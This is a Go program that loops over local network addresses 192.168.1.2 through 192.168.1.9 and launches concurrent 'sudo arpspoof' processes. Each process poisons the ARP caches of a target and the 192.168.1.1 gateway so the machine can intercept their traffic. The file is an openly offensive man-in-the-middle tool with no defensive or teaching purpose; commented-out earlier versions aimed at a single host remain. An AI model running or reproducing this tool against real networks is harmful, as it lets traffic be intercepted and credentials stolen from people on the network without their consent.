// sudo arpspoof -i enp2s0 -t 192.168.1.7 -r 192.168.1.1
package main

import (
	// "bufio"
	"fmt"
	"log"
	"os/exec"
	"strconv"
	"sync"
)

var (
	wg sync.WaitGroup
)

const (
	sudo        = "sudo"
	cmd         = "arpspoof"
	intrfc_flag = "-i"
	intrfc      = "enp2s0"
	target_flag = "-t"
	host_flag   = "-r "
	host        = "192.168.1.1"
)

func main() {
	wg.Add(7)

	for i := 2; i < 10; i++ {
		if i == 5 {
			continue
		}

		target := fmt.Sprintf("192.168.1.%v", strconv.Itoa(i))
		// target := fmt.Sprintf("192.168.1.%v", strconv.Itoa(i))

		fmt.Println(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)

		go func() {
			defer wg.Done()
			// command := exec.Command("ping", target)
			// command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, target, host_flag, host)
			command := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", target, "-r", "192.168.1.1")
			err := command.Run()
			if err != nil {
				log.Fatal(err)
			}
		}()
	}

	wg.Wait()

	// cmmand := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", "192.168.1.7", "-r", "192.168.1.1")
	// cmmand := exec.Command("ping", "192.168.1.7")

	// cmdReader, err := cmmand.StdoutPipe()
	// if err != nil {
	// 	log.Fatal(err)
	// }
	// scanner := bufio.NewScanner(cmdReader)
	// go func() {
	// 	for scanner.Scan() {
	// 		log.Println(scanner.Text())
	// 	}
	// }()

	// err = cmmand.Run()
	// if err != nil {
	// 	log.Fatal(err)
	// }

	// command := exec.Command("ping", target)
	// command := exec.Command(sudo, cmd, intrfc_flag, intrfc, target_flag, "192.168.1.7", host_flag, host)
	// command := exec.Command("sudo", "arpspoof", "-i", "enp2s0", "-t", "192.168.1.7", "-r", "192.168.1.1")
	// err := command.Run()
	// if err != nil {
	// log.Fatal(err)
}
